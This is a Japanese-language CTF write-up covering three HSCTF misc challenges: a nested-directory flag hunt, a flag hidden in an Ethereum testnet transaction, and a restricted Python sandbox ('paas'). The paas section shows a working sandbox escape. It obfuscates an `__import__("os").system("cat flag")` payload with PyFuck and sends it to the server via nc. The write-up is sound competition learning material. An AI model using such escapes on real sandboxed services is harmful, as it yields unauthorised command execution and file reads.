# misc

### the-great-directory-egg-hunt

Lots of branching paths, but how do we get to the correct file?

### writeup

大量のフォルダが格納されているzipが渡されます。`cat ./**/* > log`で中身を全て見ると、意味のある文字列が出てきました。

```
NopeNopeNopeNopeNopeNopeNopeNopeNopeNopeNopeNopeNopeNopeNopeNopeNopeNopeNopeNopeNopeNopeNopeNopeNopeNopeNopeNopeNopeNopeNopeNopeNopeNopeNopeNopeNopeIf y
ou followed the directories to here, you have found the flag!
Use the directory names (without slashes) as part of the flag, then wrap it in the flag format "flag{}".NopeNopeNopeNopeNopeNopeNopeNopeNopeNopeNopeNope
NopeNopeNopeNopeNopeNopeNopeNopeNopeNopeNopeNopeNopeNopeNopeNopeNopeNopeNopeNopeNopeNopeN
```

vscodeでflagと検索すると、`dir/Tw/3l/v3/_D/1r/s_/D3/3p/_6/Gi/TQ/Ez/file.txt`にて書かれていたので、あとはスラッシュを省けばフラグゲットです。

### flag

```
flag{Tw3lv3_D1rs_D33p_6GiTQEz}
```


## onchain-baller

Have this Ropsten testnet address: 0x339d58bff8b8C5dAAfaF08fA77ad39C7909B194E

### writeup

Ropstenがイーサリアムに関する用語でした。
「Ropsten testnet」で調べるとhttps://ropsten.etherscan.io/ がひっかかりました。

サイト内検索にて「0x339d58bff8b8C5dAAfaF08fA77ad39C7909B194E」を調べて、詳細を調べると以下のサイトでutf-8エンコードするとフラグが現れました。

https://ropsten.etherscan.io/tx/0xce01ddd8ad56b6b9b11796f9ebf1cd29e7034d82ff98978f2c4178a91a34cf46


### flag

hsctf{1_b411_0n_4nd_0ff_th3_ch41n}

## paas

Run Python code from anywhere! nc paas.hsctf.com 1337

### writeup

接続して、vars()を入力すると特定のビルトイン関数しか使えませんでした。

```python
>vars()
{'__name__': 'builtins', '__doc__': "Built-in functions, exceptions, and other objects.\n\nNoteworthy: None is the `nil' object; Ellipsis represents `...' in slices.", '__package__': '', '__loader__': <class '_frozen_importlib.BuiltinImporter'>, '__spec__': ModuleSpec(name='builtins', loader=<class '_frozen_importlib.BuiltinImporter'>), '__build_class__': <built-in function __build_class__>, 'abs': <built-in function abs>, 'all': <built-in function all>, 'any': <built-in function any>, 'ascii': <built-in function ascii>, 'bin': <built-in function bin>, 'breakpoint': <built-in function breakpoint>, 'callable': <built-in function callable>, 'chr': <built-in function chr>, 'compile': <built-in function compile>, 'delattr': <built-in function delattr>, 'dir': <built-in function dir>, 'divmod': <built-in function divmod>, 'format': <built-in function format>, 'globals': <built-in function globals>, 'hasattr': <built-in function hasattr>, 'hash': <built-in function hash>, 'hex': <built-in function hex>, 'id': <built-in function id>, 'input': <built-in function input>, 'isinstance': <built-in function isinstance>, 'issubclass': <built-in function issubclass>, 'iter': <built-in function iter>, 'len': <built-in function len>, 'locals': <built-in function locals>, 'max': <built-in function max>, 'min': <built-in function min>, 'next': <built-in function next>, 'oct': <built-in function oct>, 'ord': <built-in function ord>, 'pow': <built-in function pow>, 'print': <built-in function print>, 'repr': <built-in function repr>, 'round': <built-in function round>, 'setattr': <built-in function setattr>, 'sorted': <built-in function sorted>, 'sum': <built-in function sum>, 'vars': <built-in function vars>, 'None': None, 'Ellipsis': Ellipsis, 'NotImplemented': NotImplemented, 'False': False, 'True': True, 'bool': <class 'bool'>, 'memoryview': <class 'memoryview'>, 'bytearray': <class 'bytearray'>, 'bytes': <class 'bytes'>, 'classmethod': <class 'classmethod'>, 'complex': <class 'complex'>, 'dict': <class 'dict'>, 'enumerate': <class 'enumerate'>, 'filter': <class 'filter'>, 'float': <class 'float'>, 'frozenset': <class 'frozenset'>, 'property': <class 'property'>, 'int': <class 'int'>, 'list': <class 'list'>, 'map': <class 'map'>, 'object': <class 'object'>, 'range': <class 'range'>, 'reversed': <class 'reversed'>, 'set': <class 'set'>, 'slice': <class 'slice'>, 'staticmethod': <class 'staticmethod'>, 'str': <class 'str'>, 'super': <class 'super'>, 'tuple': <class 'tuple'>, 'type': <class 'type'>, 'zip': <class 'zip'>, '__debug__': True, 'BaseException': <class 'BaseException'>, 'Exception': <class 'Exception'>, 'TypeError': <class 'TypeError'>, 'StopAsyncIteration': <class 'StopAsyncIteration'>, 'StopIteration': <class 'StopIteration'>, 'GeneratorExit': <class 'GeneratorExit'>, 'SystemExit': <class 'SystemExit'>, 'KeyboardInterrupt': <class 'KeyboardInterrupt'>, 'ImportError': <class 'ImportError'>, 'ModuleNotFoundError': <class 'ModuleNotFoundError'>, 'OSError': <class 'OSError'>, 'EnvironmentError': <class 'OSError'>, 'IOError': <class 'OSError'>, 'EOFError': <class 'EOFError'>, 'RuntimeError': <class 'RuntimeError'>, 'RecursionError': <class 'RecursionError'>, 'NotImplementedError': <class 'NotImplementedError'>, 'NameError': <class 'NameError'>, 'UnboundLocalError': <class 'UnboundLocalError'>, 'AttributeError': <class 'AttributeError'>, 'SyntaxError': <class 'SyntaxError'>, 'IndentationError': <class 'IndentationError'>, 'TabError': <class 'TabError'>, 'LookupError': <class 'LookupError'>, 'IndexError': <class 'IndexError'>, 'KeyError': <class 'KeyError'>, 'ValueError': <class 'ValueError'>, 'UnicodeError': <class 'UnicodeError'>, 'UnicodeEncodeError': <class 'UnicodeEncodeError'>, 'UnicodeDecodeError': <class 'UnicodeDecodeError'>, 'UnicodeTranslateError': <class 'UnicodeTranslateError'>, 'AssertionError': <class 'AssertionError'>, 'ArithmeticError': <class 'ArithmeticError'>, 'FloatingPointError': <class 'FloatingPointError'>, 'OverflowError': <class 'OverflowError'>, 'ZeroDivisionError': <class 'ZeroDivisionError'>, 'SystemError': <class 'SystemError'>, 'ReferenceError': <class 'ReferenceError'>, 'MemoryError': <class 'MemoryError'>, 'BufferError': <class 'BufferError'>, 'Warning': <class 'Warning'>, 'UserWarning': <class 'UserWarning'>, 'DeprecationWarning': <class 'DeprecationWarning'>, 'PendingDeprecationWarning': <class 'PendingDeprecationWarning'>, 'SyntaxWarning': <class 'SyntaxWarning'>, 'RuntimeWarning': <class 'RuntimeWarning'>, 'FutureWarning': <class 'FutureWarning'>, 'ImportWarning': <class 'ImportWarning'>, 'UnicodeWarning': <class 'UnicodeWarning'>, 'BytesWarning': <class 'BytesWarning'>, 'ResourceWarning': <class 'ResourceWarning'>, 'ConnectionError': <class 'ConnectionError'>, 'BlockingIOError': <class 'BlockingIOError'>, 'BrokenPipeError': <class 'BrokenPipeError'>, 'ChildProcessError': <class 'ChildProcessError'>, 'ConnectionAbortedError': <class 'ConnectionAbortedError'>, 'ConnectionRefusedError': <class 'ConnectionRefusedError'>, 'ConnectionResetError': <class 'ConnectionResetError'>, 'FileExistsError': <class 'FileExistsError'>, 'FileNotFoundError': <class 'FileNotFoundError'>, 'IsADirectoryError': <class 'IsADirectoryError'>, 'NotADirectoryError': <class 'NotADirectoryError'>, 'InterruptedError': <class 'InterruptedError'>, 'PermissionError': <class 'PermissionError'>, 'ProcessLookupError': <class 'ProcessLookupError'>, 'TimeoutError': <class 'TimeoutError'>, 'quit': Use quit() or Ctrl-D (i.e. EOF) to exit, 'exit': Use exit() or Ctrl-D (i.e. EOF) to exit, 'copyright': Copyright (c) 2001-2021 Python Software Foundation.
All Rights Reserved.
```

ctf4bにもあった、`help()`系の手法はダメだった。`import os`を入力しても弾かれる。

eval, exec, chrあたりが有効であるため、[Pyfuck](https://github.com/satoki/PyFuck)が使うとフラグがとれました。

```bash
echo '__import__("os").system("cat flag") > test.py'
python3 pyfuck.py
...
cat output.py | nc paas.hsctf.com 1337
== proof-of-work: disabled ==
Python as a Service:
Execute arbitrary Python code (with certain restrictions)
> flag{vuln3r4b1l17y_45_4_53rv1c3}
None

```

### flag

```
flag{vuln3r4b1l17y_45_4_53rv1c3}
```

